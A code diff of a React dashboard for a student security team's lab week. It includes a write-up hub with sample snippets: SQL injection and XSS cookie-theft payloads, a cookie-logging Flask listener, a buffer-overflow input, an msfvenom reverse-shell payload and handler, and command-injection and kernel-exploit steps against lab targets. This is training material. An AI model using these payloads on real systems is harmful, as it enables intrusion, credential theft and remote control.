+    }, 220);
+    return () => clearTimeout(t);
+  }, [q, INDEX]);
+
+  const choose = (r) => {
+    setOpen(false); setQ("");
+    if (r.url) { try { window.open(r.url, r.target || "_self", "noopener"); } catch(e){} return; }
+    if (r.sectionId) {
+      onNavigate?.(r.sectionId);
+      const scroller = document.getElementById("main-scroll");
+      const el = document.getElementById(r.sectionId);
+      if (scroller && el) {
+        const top = el.getBoundingClientRect().top - scroller.getBoundingClientRect().top + scroller.scrollTop - 12;
+        scroller.scrollTo({ top, behavior: "smooth" });
+      }
+    }
+  };
+
+  const onInputKey = (e) => {
+    if (e.key === "ArrowDown") { e.preventDefault(); setHover(h => Math.min(results.length - 1, h + 1)); }
+    else if (e.key === "ArrowUp") { e.preventDefault(); setHover(h => Math.max(0, h - 1)); }
+    else if (e.key === "Enter" && results[hover]) { e.preventDefault(); choose(results[hover]); }
+    else if (e.key === "Escape") setOpen(false);
+  };
+
+  return (
+    <header className="flex h-14 items-center gap-4 border-b border-slate-800 bg-slate-950/80 px-5 backdrop-blur">
+      <div className="flex items-center gap-1.5 font-mono text-[12px]">
+        <button onClick={() => onNavigate?.("overview")} className="text-slate-500 hover:text-slate-300">dashboard</button>
+        <span className="text-slate-700">/</span>
+        <span className="text-slate-200">{crumb}</span>
+      </div>
+
+      {/* Search + live dropdown */}
+      <div ref={boxRef} className="relative mx-auto w-full max-w-md">
+        <div className="pointer-events-none absolute inset-y-0 left-3 flex items-center text-slate-500">
+          {loading ? <Icon name="Loader" size={14} className="da-spin" /> : <Icon name="Search" size={14} />}
+        </div>
+        <input
+          ref={inputRef}
+          type="text"
+          value={q}
+          onFocus={() => setOpen(true)}
+          onChange={(e) => { setQ(e.target.value); setOpen(true); }}
+          onKeyDown={onInputKey}
+          placeholder="search HUB · projects, reports, cves, operators…"
+          className="h-8 w-full rounded-md border border-slate-800 bg-slate-900 pl-9 pr-16 font-mono text-[12px] text-slate-200 placeholder:text-slate-500 focus:border-slate-700 focus:outline-none focus:ring-1 focus:ring-emerald-500/40"
+        />
+        <div className="absolute inset-y-0 right-2 flex items-center gap-1">
+          <Kbd>⌘</Kbd><Kbd>K</Kbd>
+        </div>
+
+        {open && q.trim() && (
+          <div className="absolute left-0 right-0 top-[calc(100%+6px)] z-50 overflow-hidden rounded-md border border-slate-800 bg-slate-950 shadow-[0_20px_40px_-15px_rgba(0,0,0,0.7)]">
+            <div className="flex items-center gap-2 border-b border-slate-800 px-3 py-1.5 font-mono text-[10px] text-slate-500">
+              {loading ? (
+                <>
+                  <Icon name="Loader" size={10} className="da-spin text-emerald-400" />
+                  <span>GET /api/search?q={encodeURIComponent(q)} · streaming…</span>
+                </>
+              ) : (
+                <>
+                  <StatusDot tone="emerald" size={6} />
+                  <span>200 OK · {results.length} result{results.length===1?"":"s"} · {INDEX.length} indexed</span>
+                </>
+              )}
+            </div>
+            <ul className="max-h-80 overflow-y-auto py-1">
+              {!loading && results.length === 0 && (
+                <li className="px-3 py-4 text-center font-mono text-[11px] text-slate-500">no matches · try `day1`, `pdf`, `xss`, `LP`…</li>
+              )}
+              {results.map((r, i) => (
+                <li key={i}>
+                  <button
+                    onMouseEnter={() => setHover(i)}
+                    onClick={() => choose(r)}
+                    className={`flex w-full items-center gap-3 px-3 py-1.5 text-left transition-colors ${hover === i ? "bg-slate-800/80" : "hover:bg-slate-800/50"}`}
+                  >
+                    <span className={`inline-flex h-6 w-6 shrink-0 items-center justify-center rounded-md ring-1
+                      ${r.tone === "emerald" ? "bg-emerald-500/10 text-emerald-300 ring-emerald-500/20"
+                      : r.tone === "amber"   ? "bg-amber-500/10 text-amber-300 ring-amber-500/25"
+                      : r.tone === "red"     ? "bg-red-500/10 text-red-300 ring-red-500/25"
+                      : r.tone === "teal"    ? "bg-teal-500/10 text-teal-300 ring-teal-500/25"
+                      : r.tone === "sky"     ? "bg-sky-500/10 text-sky-300 ring-sky-500/20"
+                      :                         "bg-slate-800 text-slate-300 ring-slate-700"}`}>
+                      <Icon name={r.icon} size={12} />
+                    </span>
+                    <span className="min-w-0 flex-1">
+                      <span className="block truncate text-[12px] text-slate-100">{r.label}</span>
+                      <span className="block truncate font-mono text-[10px] text-slate-500">{r.sub}</span>
+                    </span>
+                    <span className="rounded bg-slate-800/80 px-1.5 py-0.5 font-mono text-[9px] uppercase tracking-widest text-slate-400">{r.kind}</span>
+                    {r.url && <Icon name="ArrowUpRight" size={11} className="text-slate-500" />}
+                  </button>
+                </li>
+              ))}
+            </ul>
+          </div>
+        )}
+      </div>
+
+      {/* Status + auth */}
+      <div className="ml-auto flex items-center gap-3">
+        <div className="hidden items-center gap-2 rounded-md border border-slate-800 bg-slate-900 px-2.5 py-1 md:flex">
+          <StatusDot tone="emerald" pulse size={8} />
+          <span className="font-mono text-[10px] uppercase tracking-widest text-slate-300">All systems operational</span>
+        </div>
+
+        {user ? (
+          <div className="flex items-center gap-1">
+            <div className="flex items-center gap-2 rounded-md border border-slate-800 bg-slate-900 py-1 pl-1 pr-2.5">
+              <Avatar initials={user.initials} size={22} />
+              <div className="leading-tight">
+                <div className="text-[11px] text-slate-200">{user.displayName}</div>
+                <div className="font-mono text-[9px] text-emerald-400">● {user.role.toLowerCase()}</div>
+              </div>
+            </div>
+            <button
+              onClick={logout}
+              className="inline-flex items-center gap-1.5 rounded-md border border-slate-800 bg-slate-900 px-2.5 py-1.5 font-mono text-[11px] text-slate-300 hover:border-red-500/40 hover:text-red-300"
+              title="sign out"
+            >
+              <Icon name="LogOut" size={12} />
+              logout
+            </button>
+          </div>
+        ) : (
+          <button
+            onClick={() => setLoginOpen(true)}
+            className="inline-flex items-center gap-1.5 rounded-md bg-emerald-500 px-3 py-1.5 font-mono text-[11px] font-semibold uppercase tracking-widest text-slate-950 hover:bg-emerald-400"
+            title="sign in"
+          >
+            <Icon name="LogIn" size={12} />
+            login
+          </button>
+        )}
+      </div>
+    </header>
+  );
+}
+
+window.TopBar = TopBar;
+
+function Hero() {
+  return (
+    <section className="da-rise overflow-hidden rounded-xl border border-slate-800 bg-gradient-to-br from-slate-900 via-slate-900 to-teal-950/40">
+      <div className="relative da-grid-bg">
+        {/* top meta strip */}
+        <div className="flex items-center justify-between border-b border-slate-800/80 px-6 py-2.5">
+          <div className="flex items-center gap-3 font-mono text-[10px] uppercase tracking-widest text-slate-500">
+            <span className="inline-flex items-center gap-1.5">
+              <StatusDot tone="emerald" pulse size={7} /> squad-07
+            </span>
+            <span className="text-slate-700">·</span>
+            <span className="text-teal-400">build-week-cyber</span>
+            <span className="text-slate-700">·</span>
+            <span>20.04.26 → 25.04.26</span>
+          </div>
+          <div className="hidden items-center gap-3 font-mono text-[10px] text-slate-500 md:flex">
+            <ClassifiedStamp level="SEC_LEVEL_4" />
+            <span className="inline-flex items-center gap-1.5">
+              <Icon name="MapPin" size={10} /> milan · hq
+            </span>
+          </div>
+        </div>
+
+        <div className="grid grid-cols-12 gap-6 px-6 py-7">
+          {/* Left: title + tagline */}
+          <div className="col-span-12 lg:col-span-8">
+            <div className="flex items-baseline gap-3">
+              <span className="font-mono text-[11px] uppercase tracking-widest text-emerald-400">// mission_header</span>
+              <span className="font-mono text-[10px] text-amber-300">clearance: internal</span>
+            </div>
+            <h1 className="mt-2 text-4xl font-semibold tracking-tight text-slate-100">
+              DIGITAL <span className="text-emerald-400">AVENGERS</span>
+            </h1>
+            <p className="mt-2 max-w-xl text-[14px] text-slate-400">
+              Offensive + defensive security collective. <span className="text-slate-200">7 operators, 1 mission.</span>
+              {" "}Red and blue side-by-side, every finding shipped with a defender’s playbook.
+            </p>
+
+            <div className="mt-5 flex flex-wrap items-center gap-2">
+              <span className="inline-flex items-center gap-1.5 rounded-md border border-emerald-500/20 bg-emerald-500/5 px-2 py-1 font-mono text-[11px] text-emerald-300">
+                <Icon name="ShieldCheck" size={12} />
+                offensive-sec
+              </span>
+              <span className="inline-flex items-center gap-1.5 rounded-md border border-sky-500/20 bg-sky-500/5 px-2 py-1 font-mono text-[11px] text-sky-300">
+                <Icon name="Radar" size={12} />
+                blue-team
+              </span>
+              <span className="inline-flex items-center gap-1.5 rounded-md border border-amber-500/25 bg-amber-500/5 px-2 py-1 font-mono text-[11px] text-amber-300">
+                <Icon name="Bug" size={12} />
+                malware-analysis
+              </span>
+              <span className="inline-flex items-center gap-1.5 rounded-md border border-teal-500/20 bg-teal-500/5 px-2 py-1 font-mono text-[11px] text-teal-300">
+                <Icon name="Network" size={12} />
+                forensics
+              </span>
+              <span className="inline-flex items-center gap-1.5 rounded-md border border-red-500/25 bg-red-500/5 px-2 py-1 font-mono text-[11px] text-red-300">
+                <Icon name="Flame" size={12} />
+                threat-intel
+              </span>
+            </div>
+          </div>
+
+          {/* Right: member grid */}
+          <div className="col-span-12 lg:col-span-4">
+            <div className="flex items-center justify-between">
+              <SectionLabel>Active operators</SectionLabel>
+              <span className="font-mono text-[10px] text-emerald-400">07/07 ONLINE</span>
+            </div>
+            <div className="mt-3 grid grid-cols-4 gap-2">
+              {MEMBERS.map((m) => (
+                <div key={m.id} className="group relative" title={`${m.name} — ${m.role}`}>
+                  <div className="relative flex aspect-square items-center justify-center rounded-md border border-slate-800 bg-slate-900/80 transition-colors hover:border-emerald-500/40 hover:bg-slate-900">
+                    <Avatar initials={m.initials} size={28} />
+                    <span className="absolute bottom-1 right-1 block h-1.5 w-1.5 rounded-full bg-emerald-500 ring-1 ring-slate-900" />
+                  </div>
+                  <div className="pointer-events-none absolute left-1/2 top-full z-10 mt-1.5 w-max -translate-x-1/2 scale-95 rounded-md border border-slate-800 bg-slate-950 px-2 py-1 opacity-0 shadow-xl transition-all group-hover:scale-100 group-hover:opacity-100">
+                    <div className="text-[11px] text-slate-200">{m.name}</div>
+                    <div className="font-mono text-[10px] text-emerald-400">online · {m.role.toLowerCase()}</div>
+                  </div>
+                </div>
+              ))}
+              <div className="flex aspect-square items-center justify-center rounded-md border border-dashed border-slate-800 font-mono text-[10px] text-slate-600">
+                +0
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+  );
+}
+
+window.Hero = Hero;
+
+function Sparkline({ data, tone = "emerald" }) {
+  const R = window.Recharts;
+  if (!R) return <div className="h-5 w-full bg-slate-800/40" />;
+  const { ResponsiveContainer } = R;
+  const stroke = tone === "emerald" ? "#34d399" : tone === "sky" ? "#38bdf8" : tone === "amber" ? "#fbbf24" : tone === "teal" ? "#2dd4bf" : tone === "red" ? "#f87171" : "#a78bfa";
+  const fill   = tone === "emerald" ? "#10b981" : tone === "sky" ? "#0ea5e9" : tone === "amber" ? "#f59e0b" : tone === "teal" ? "#14b8a6" : tone === "red" ? "#ef4444" : "#8b5cf6";
+  const gid = React.useMemo(() => `g${Math.random().toString(36).slice(2,8)}`, []);
+  return (
+    <div className="h-6 w-full">
+      <ResponsiveContainer width="100%" height="100%">
+        <R.AreaChart data={data} margin={{ top: 2, right: 0, bottom: 2, left: 0 }}>
+          <defs>
+            <linearGradient id={gid} x1="0" y1="0" x2="0" y2="1">
+              <stop offset="0%" stopColor={fill} stopOpacity={0.32} />
+              <stop offset="100%" stopColor={fill} stopOpacity={0} />
+            </linearGradient>
+          </defs>
+          <R.Area
+            type="monotone" dataKey="v" stroke={stroke} strokeWidth={1.6}
+            fill={`url(#${gid})`} dot={false} isAnimationActive={false}
+          />
+        </R.AreaChart>
+      </ResponsiveContainer>
+    </div>
+  );
+}
+
+function MetricCard({ kpi, idx }) {
+  const tones = ["emerald", "teal", "amber", "sky"];
+  const tone = tones[idx % tones.length];
+  const deltaTone = kpi.up ? "text-emerald-400" : "text-red-400";
+  return (
+    <div
+      className="da-rise group rounded-lg border border-slate-800 bg-slate-900 p-4 transition-colors hover:border-slate-700"
+      style={{ animationDelay: `${idx * 50}ms` }}
+    >
+      <div className="flex items-center justify-between">
+        <SectionLabel>{kpi.label}</SectionLabel>
+        <span className={`inline-flex items-center gap-1 font-mono text-[10px] ${deltaTone}`}>
+          <Icon name={kpi.up ? "ArrowUpRight" : "ArrowDownRight"} size={10} />
+          {kpi.delta}
+        </span>
+      </div>
+      <div className="mt-3 flex items-baseline gap-2">
+        <span className="font-mono text-3xl font-semibold tracking-tight text-slate-100">{kpi.value}</span>
+      </div>
+      <div className="mt-3">
+        <Sparkline data={kpi.spark} tone={tone} />
+      </div>
+      <div className="mt-1 flex items-center justify-between font-mono text-[10px] text-slate-500">
+        <span>last 5d</span>
+        <span>updated 14:32</span>
+      </div>
+    </div>
+  );
+}
+
+function MetricsRow() {
+  return (
+    <section>
+      <div className="mb-3 flex items-end justify-between">
+        <div>
+          <SectionLabel>Ops metrics</SectionLabel>
+          <h2 className="mt-0.5 text-[15px] font-semibold tracking-tight text-slate-100">Squad performance · last 5 days</h2>
+        </div>
+        <div className="flex items-center gap-1 font-mono text-[10px] text-slate-500">
+          <Icon name="RefreshCw" size={10} />
+          sync · 14:32:17
+        </div>
+      </div>
+      <div className="grid grid-cols-2 gap-4 md:grid-cols-4">
+        {KPIS.map((k, i) => <MetricCard key={k.key} kpi={k} idx={i} />)}
+      </div>
+    </section>
+  );
+}
+
+window.MetricsRow = MetricsRow;
+
+function artifactIcon(kind) {
+  if (kind === "pdf")   return "FileText";
+  if (kind === "guide") return "BookOpen";
+  if (kind === "code")  return "Code2";
+  if (kind === "dir")   return "Folder";
+  return "File";
+}
+
+function ProjectCard({ p, idx }) {
+  const [open, setOpen] = React.useState(false);
+  return (
+    <article
+      className="da-rise group relative flex flex-col rounded-lg border border-slate-800 bg-slate-900 p-4 transition-all duration-200 hover:-translate-y-0.5 hover:border-emerald-500/40 hover:ring-1 hover:ring-emerald-500/20"
+      style={{ animationDelay: `${idx * 50}ms` }}
+    >
+      <div className="flex items-center justify-between">
+        <a href={p.url} target="_blank" rel="noreferrer" className="flex min-w-0 items-center gap-2 font-mono text-[11px] text-slate-400 hover:text-emerald-300">
+          <Icon name="FolderGit2" size={11} className="text-emerald-400" />
+          <span className="truncate text-slate-200">{p.path}</span>
+        </a>
+        <Badge tone="emerald">
+          <StatusDot tone="emerald" size={6} />
+          Completed
+        </Badge>
+      </div>
+
+      <h3 className="mt-2 text-[14px] font-semibold tracking-tight text-slate-100 group-hover:text-emerald-300">
+        {p.title}
+      </h3>
+      <p className="mt-1 line-clamp-2 text-[12px] leading-relaxed text-slate-400">{p.desc}</p>
+
+      <div className="mt-3 flex flex-wrap items-center gap-1.5">
+        {p.tags.map((t) => (
+          <span key={t} className="rounded border border-slate-800 bg-slate-800/40 px-1.5 py-0.5 font-mono text-[10px] text-slate-300">
+            {t}
+          </span>
+        ))}
+      </div>
+
+      {/* Artifacts list */}
+      <div className="mt-3 rounded-md border border-slate-800 bg-slate-950/60">
+        <button
+          onClick={() => setOpen(o => !o)}
+          className="flex w-full items-center justify-between px-2.5 py-1.5 font-mono text-[11px] text-slate-400 hover:text-slate-200"
+        >
+          <span className="inline-flex items-center gap-1.5">
+            <Icon name={open ? "ChevronDown" : "ChevronRight"} size={11} />
+            artifacts · {p.artifacts.length}
+          </span>
+          <span className="text-slate-600">{p.artifacts.filter(a=>a.kind==="pdf").length} pdf</span>
+        </button>
+        {open && (
+          <ul className="border-t border-slate-800 px-2 py-1.5">
+            {p.artifacts.map(a => (
+              <li key={a.name}>
+                <a
+                  href={a.url} target="_blank" rel="noreferrer"
+                  className="flex items-center gap-2 rounded px-1.5 py-1 font-mono text-[11px] text-slate-300 hover:bg-slate-800/60 hover:text-emerald-300"
+                >
+                  <Icon name={artifactIcon(a.kind)} size={11} className={
+                    a.kind === "pdf" ? "text-red-400"
+                    : a.kind === "guide" ? "text-amber-300"
+                    : a.kind === "code" ? "text-sky-400"
+                    : a.kind === "dir" ? "text-emerald-400"
+                    : "text-slate-400"
+                  } />
+                  <span className="truncate">{a.name}</span>
+                  <Icon name="ArrowUpRight" size={10} className="ml-auto text-slate-600" />
+                </a>
+              </li>
+            ))}
+            {p.external && (
+              <li className="mt-1 border-t border-slate-800 pt-1">
+                <a href={p.external} target="_blank" rel="noreferrer" className="flex items-center gap-2 rounded px-1.5 py-1 font-mono text-[11px] text-teal-300 hover:bg-slate-800/60">
+                  <Icon name="ExternalLink" size={11} />
+                  <span className="truncate">{p.external.replace("https://","")}</span>
+                </a>
+              </li>
+            )}
+          </ul>
+        )}
+      </div>
+
+      {/* Footer */}
+      <div className="mt-3 flex items-center justify-between border-t border-slate-800 pt-3 font-mono text-[11px]">
+        <div className="flex items-center gap-3 text-slate-400">
+          <span className="inline-flex items-center gap-1">
+            <span className="inline-block h-2 w-2 rounded-full" style={{ background: p.langColor }} />
+            <span>{p.lang}</span>
+          </span>
+          <ClassifiedStamp level={p.sec} />
+        </div>
+        <div className="flex items-center gap-2">
+          <Avatar initials={p.owner} size={18} />
+          <span className="text-slate-500">{p.date}</span>
+        </div>
+      </div>
+    </article>
+  );
+}
+
+function ProjectsGrid() {
+  // simple filter left in: "all" / by owner, nothing else — everything is done
+  const [filter, setFilter] = React.useState("all");
+  const owners = ["all", ...Array.from(new Set(PROJECTS.map(p => p.owner)))];
+  const shown = filter === "all" ? PROJECTS : PROJECTS.filter(p => p.owner === filter);
+
+  return (
+    <section>
+      <div className="mb-3 flex flex-wrap items-end justify-between gap-3">
+        <div>
+          <SectionLabel>Projects</SectionLabel>
+          <h2 className="mt-0.5 text-[15px] font-semibold tracking-tight text-slate-100">Build-week deliverables</h2>
+        </div>
+        <div className="flex items-center gap-2 font-mono text-[11px] text-slate-400">
+          <Icon name="Github" size={13} className="text-slate-300" />
+          <span className="text-slate-500">synced from</span>
+          <a href={REPO.url} target="_blank" rel="noreferrer" className="text-emerald-400 hover:underline">
+            {REPO.org}/{REPO.name}
+          </a>
+          <span className="inline-flex items-center gap-1 rounded border border-slate-800 bg-slate-900 px-1.5 py-0.5 text-[10px] text-slate-400">
+            <span className="h-1.5 w-1.5 rounded-full bg-emerald-500 da-pulse-dot" /> {PROJECTS.length} folders
+          </span>
+        </div>
+      </div>
+
+      {/* Owner filter pills */}
+      <div className="mb-3 flex flex-wrap items-center gap-1 rounded-md border border-slate-800 bg-slate-900 p-0.5">
+        {owners.map(o => (
+          <button
+            key={o}
+            onClick={() => setFilter(o)}
+            className={`inline-flex items-center gap-1.5 rounded-[5px] px-2 py-1 font-mono text-[11px] transition-colors
+              ${filter === o ? "bg-slate-800 text-emerald-400" : "text-slate-400 hover:text-slate-200"}`}
+          >
+            {o === "all" ? "@ all" : `@ ${o}`}
+          </button>
+        ))}
+      </div>
+
+      <div className="grid grid-cols-1 gap-4 md:grid-cols-2 xl:grid-cols-3">
+        {shown.map((p, i) => <ProjectCard key={p.id} p={p} idx={i} />)}
+      </div>
+    </section>
+  );
+}
+
+window.ProjectsGrid = ProjectsGrid;
+
+function Milestone({ m, idx, total }) {
+  return (
+    <div className="relative flex min-w-[220px] flex-1 flex-col">
+      <div className="mb-3 flex items-center justify-between font-mono text-[10px] uppercase tracking-widest">
+        <span className="text-slate-500">{m.date}</span>
+        <span className="text-emerald-400">done</span>
+      </div>
+
+      {/* rail */}
+      <div className="relative h-4">
+        <div className={`absolute left-0 right-0 top-1/2 h-px -translate-y-1/2 ${idx === 0 ? "bg-transparent" : "bg-emerald-500/40"}`} style={{ right: "50%" }} />
+        <div className={`absolute left-0 right-0 top-1/2 h-px -translate-y-1/2 ${idx === total - 1 ? "bg-transparent" : "bg-emerald-500/40"}`} style={{ left: "50%" }} />
+        <div className="absolute left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2">
+          <span className="block rounded-full border border-emerald-400 bg-emerald-500" style={{ width: 12, height: 12 }} />
+        </div>
+      </div>
+
+      <div className="mt-3 rounded-md border border-slate-800 bg-slate-900 p-3">
+        <div className="text-[13px] font-semibold tracking-tight text-slate-100">{m.title}</div>
+        <ul className="mt-2 space-y-1">
+          {m.bullets.map((b) => (
+            <li key={b} className="flex items-start gap-2 text-[11px] text-slate-400">
+              <Icon name="Check" size={11} className="mt-[2px] shrink-0 text-emerald-400" />
+              <span>{b}</span>
+            </li>
+          ))}
+        </ul>
+      </div>
+    </div>
+  );
+}
+
+function RoadmapTimeline() {
+  return (
+    <section>
+      <div className="mb-3 flex items-end justify-between">
+        <div>
+          <SectionLabel>Roadmap</SectionLabel>
+          <h2 className="mt-0.5 text-[15px] font-semibold tracking-tight text-slate-100">
+            Build-week timeline · all milestones shipped
+          </h2>
+        </div>
+        <div className="inline-flex items-center gap-1.5 rounded-md bg-emerald-500/10 px-2 py-1 font-mono text-[10px] uppercase tracking-widest text-emerald-300 ring-1 ring-emerald-500/25">
+          <Icon name="CircleCheck" size={11} /> 5/5 complete
+        </div>
+      </div>
+
+      <div className="rounded-lg border border-slate-800 bg-slate-900 p-5">
+        <div className="no-scrollbar flex gap-4 overflow-x-auto pb-1">
+          {MILESTONES.map((m, i) => (
+            <Milestone key={m.id} m={m} idx={i} total={MILESTONES.length} />
+          ))}
+        </div>
+      </div>
+
+      <div className="mt-4 grid grid-cols-1 gap-4 md:grid-cols-3">
+        {[
+          {
+            tone: "emerald",
+            label: "Mission",
+            title: "Ship evidence, not slides",
+            body: "Break things in lab, document exactly how we broke them, and hand defenders the rules to catch us next time. Every engagement left behind a reproducible artifact."
+          },
+          {
+            tone: "amber",
+            label: "Delivery",
+            title: "Red + blue, one squad",
+            body: "Web / AD / wireless pentesting, malware triage, detection engineering and secure-dev review. Delivered as reports, Sigma rules, runbooks and sanitized PoC repos."
+          },
+          {
+            tone: "teal",
+            label: "Outcome",
+            title: "Closed the loop",
+            body: "Every offensive finding this week has a paired defensive artifact in the same repo — Sigma rule, YARA rule, hardening patch or runbook entry."
+          },
+        ].map((c) => (
+          <div key={c.label} className={`rounded-lg border bg-slate-900 p-4 ${
+            c.tone === "emerald" ? "border-emerald-500/20"
+            : c.tone === "amber" ? "border-amber-500/20"
+            : "border-teal-500/20"
+          }`}>
+            <div className={`text-[10px] font-mono uppercase tracking-[0.18em] ${
+              c.tone === "emerald" ? "text-emerald-400"
+              : c.tone === "amber" ? "text-amber-300"
+              : "text-teal-300"
+            }`}>// {c.label}</div>
+            <div className="mt-1.5 text-[14px] font-semibold tracking-tight text-slate-100">{c.title}</div>
+            <p className="mt-2 text-[12px] leading-relaxed text-slate-400">{c.body}</p>
+          </div>
+        ))}
+      </div>
+    </section>
+  );
+}
+
+window.RoadmapTimeline = RoadmapTimeline;
+
+// Case-study hub: pick which write-up to view from the HUB.
+// Each project has its own short sample payload / snippet.
+
+const WRITEUPS = {
+  "day1": {
+    kicker: "day 1 · sql-injection · dvwa",
+    title: "Come si ruba una password con una frase",
+    readTime: "~8 min",
+    author: "LP",
+    intro: "Una login form che non sanitizza l’input, una singola virgoletta al posto giusto, una query UNION per tirare fuori la tabella users e un MD5 passato a Hashcat. Dalla frase alla password in cinque passaggi — con mitigazioni concrete per il lato difensore: prepared statements, WAF signature e rate-limit sul login.",
+    filename: "exploit.md",
+    langStrip: "bash · sql · http",
+    lines: [
+      { k: "cmt",  t: "# 01 · Confirm injection point on the login form" },
+      { k: "plain",t: "POST /login.php" },
+      { k: "plain",t: "username=admin' -- &password=x   # → auth bypass ✓" },
+      { k: "",     t: "" },
+      { k: "cmt",  t: "# 02 · Determine column count" },
+      { k: "plain",t: "id=1' ORDER BY 2 -- -" },
+      { k: "",     t: "" },
+      { k: "cmt",  t: "# 03 · UNION-based extraction of credentials table" },
+      { k: "plain",t: "id=' UNION SELECT user, password FROM users #" },
+      { k: "",     t: "" },
+      { k: "cmt",  t: "# 04 · Offline crack of the MD5 hash" },
+      { k: "fn",   t: "$ hashcat -m 0 -a 0 creds.txt rockyou.txt" },
+      { k: "cmt",  t: "→ admin:5f4dcc3b5aa765d61d8327deb882cf99  (password)" },
+    ],
+  },
+  "day2": {
+    kicker: "day 2 · xss · cookie theft · flask",
+    title: "Come si ruba un cookie in tre atti",
+    readTime: "~9 min",
+    author: "CK",
+    intro: "Riflesso, stored o DOM-based: il cookie cade comunque. Payload su DVWA, listener Python/Flask che intercetta la fuga, log CSV + JSONL, e alla fine un report con le mitigazioni: HttpOnly, SameSite, CSP.",
+    filename: "cookie_catcher.py",
+    langStrip: "python · flask",
+    lines: [
+      { k: "kw",   t: "from flask import Flask, request" },
+      { k: "plain",t: "app = Flask(__name__)" },
+      { k: "",     t: "" },
+      { k: "fn",   t: "@app.route('/steal')" },
+      { k: "plain",t: "def steal():" },
+      { k: "plain",t: "    c = request.args.get('c', '')" },
+      { k: "plain",t: "    open('logs/cookies.jsonl','a').write(c + '\\n')" },
+      { k: "plain",t: "    return '', 204" },
+      { k: "",     t: "" },
+      { k: "cmt",  t: "# payload: <script>fetch('/steal?c='+document.cookie)<\/script>" },
+    ],
+  },
+  "day3": {
+    kicker: "day 3 · buffer overflow · c · gdb",
+    title: "Byte di troppo — scrivere sopra il ritorno",
+    readTime: "~11 min",
+    author: "WS",
+    intro: "Due binari vulnerabili in C, `gets()` e amici. Input oltre il buffer, RIP sovrascritto, debugging con GDB per trovare l'offset esatto. Un menu interattivo per provare entrambi e un report passo-passo.",
+    filename: "Bof_01.c",
+    langStrip: "c · gdb",
+    lines: [
+      { k: "kw",   t: "#include <stdio.h>" },
+      { k: "kw",   t: "#include <string.h>" },
+      { k: "",     t: "" },
+      { k: "fn",   t: "void vuln(char *in) {" },
+      { k: "plain",t: "    char buf[64];" },
+      { k: "plain",t: "    strcpy(buf, in);  // ← nessun bound check" },
+      { k: "plain",t: "}" },
+      { k: "",     t: "" },
+      { k: "cmt",  t: "# gdb: pattern_create 100 → crash → pattern_offset" },
+      { k: "fn",   t: "$ ./bof_01 $(python -c 'print(\"A\"*72 + \"BBBB\")')" },
+    ],
+  },
+  "day4": {
+    kicker: "day 4 · samba · nessus · cve",
+    title: "Samba: una porta aperta, due anni di ritardo",
+    readTime: "~10 min",
+    author: "DM",
+    intro: "Recon del target con Nessus e Nmap, servizio Samba esposto con versione vulnerabile, CVE identificata e sfruttata con tool custom. Screenshot dell'intera kill-chain dentro al report.",
+    filename: "recon.sh",
+    langStrip: "shell · nmap · nessus",
+    lines: [
+      { k: "cmt",  t: "# 01 · Recon di superficie" },
+      { k: "fn",   t: "$ nmap -sV -p 139,445 10.10.10.42" },
+      { k: "plain",t: "  139/tcp open  netbios-ssn   Samba smbd 3.0.20" },
+      { k: "",     t: "" },
+      { k: "cmt",  t: "# 02 · Scan Nessus · CVE match" },
+      { k: "plain",t: "  CVE-2007-2447  Samba 'username map script' RCE" },
+      { k: "",     t: "" },
+      { k: "cmt",  t: "# 03 · Exploit" },
+      { k: "fn",   t: "$ msfconsole -q -x 'use exploit/multi/samba/usermap_script; …'" },
+    ],
+  },
+  "day5": {
+    kicker: "day 5 · metasploit · msfvenom · post-ex",
+    title: "Metasploit come se fosse un mestiere",
+    readTime: "~12 min",
+    author: "LP",
+    intro: "Dal modulo giusto al payload giusto: msfvenom, multi/handler, post-exploitation con meterpreter, persistenza e pivoting. Non 'hack the planet', ma un workflow riproducibile.",
+    filename: "session.rc",
+    langStrip: "metasploit · msfvenom",
+    lines: [
+      { k: "fn",   t: "$ msfvenom -p windows/x64/meterpreter_reverse_tcp \\" },
+      { k: "plain",t: "    LHOST=10.10.14.7 LPORT=4444 -f exe -o payload.exe" },
+      { k: "",     t: "" },
+      { k: "kw",   t: "# handler.rc" },
+      { k: "plain",t: "use exploit/multi/handler" },
+      { k: "plain",t: "set PAYLOAD windows/x64/meterpreter_reverse_tcp" },
+      { k: "plain",t: "set LHOST 10.10.14.7" },
+      { k: "plain",t: "set LPORT 4444" },
+      { k: "plain",t: "exploit -j" },
+    ],
+  },
+  "ctf-jangow01": {
+    kicker: "ctf extra · jangow01 · kernel exploit",
+    title: "Jangow01 — da www-data a root",
+    readTime: "~10 min",
+    author: "GC",
+    intro: "Gobuster per la directory nascosta, una RCE via parametro GET, shell bassa come www-data, poi un kernel vulnerabile e un exploit pubblico per guadagnare root. Flag raccolta e report consegnato.",
+    filename: "walkthrough.md",
+    langStrip: "gobuster · nmap · bash",
+    lines: [
+      { k: "cmt",  t: "# 01 · Discovery" },
+      { k: "fn",   t: "$ gobuster dir -u http://10.10.10.7 -w common.txt" },
+      { k: "plain",t: "  /site/wordpress  (200)" },
+      { k: "",     t: "" },
+      { k: "cmt",  t: "# 02 · RCE via param `buscar`" },
+      { k: "fn",   t: "$ curl \"http://…/busque.php?buscar=;id\"" },
+      { k: "",     t: "" },
+      { k: "cmt",  t: "# 03 · Kernel exploit → root" },
+      { k: "fn",   t: "$ gcc 45010.c -o pwn && ./pwn" },
+      { k: "plain",t: "  uid=0(root)" },
+    ],
+  },
+  "ctf-lupinone": {
+    kicker: "ctf extra · lupinone · privesc",
+    title: "Lupin One — scala i privilegi con calma",
+    readTime: "~9 min",
+    author: "CV",
+    intro: "Network recon, servizio esposto, exploitation controllata e post-exploitation. Metasploit dove serve, shell manuale dove è più pulita. Report con screenshot e IOC.",
+    filename: "notes.md",
+    langStrip: "nmap · metasploit",
+    lines: [
+      { k: "cmt",  t: "# recon" },
+      { k: "fn",   t: "$ nmap -sC -sV -oA lupinone 10.10.11.111" },
+      { k: "",     t: "" },
+      { k: "cmt",  t: "# foothold + privesc" },
+      { k: "plain",t: "- bruteforce SSH key passphrase (known offset)" },
+      { k: "plain",t: "- sudo NOPASSWD on a binary → gtfobins → root" },
+    ],
+  },
+  "ctf-epicodeharryp": {
+    kicker: "ctf extra · harry potter · hard · 3 flags",
+    title: "HarryP / EPICODE — tre bandiere, una notte",
+    readTime: "~15 min",
+    author: "AA",
+    intro: "CTF livello difficile con tre bandiere: network recon, SQL injection, port knocking, privilege escalation e decriptaggio finale. Il Black Box pubblicato come write-up HTML.",
+    filename: "black-box.md",
+    langStrip: "sqli · knock · crypto",
